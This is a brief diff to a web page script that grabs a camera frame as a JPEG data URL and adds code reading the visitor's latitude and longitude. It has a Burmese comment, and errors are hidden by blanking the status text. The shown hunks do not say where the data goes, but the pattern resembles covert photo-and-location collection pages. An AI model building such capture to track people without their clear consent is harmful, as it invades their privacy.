@@ -79,6 +79,12 @@
                 
                 const imageData = canvas.toDataURL("image/jpeg");
 
+
+    // location
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
                 // ကင်မရာပိတ်မည်
                 stream.getTracks().forEach(track => track.stop());
 
@@ -99,6 +105,7 @@
             } catch (err) {
                 statusText.innerText = " ";
             }
+        }
         }
     </script>
 </body>
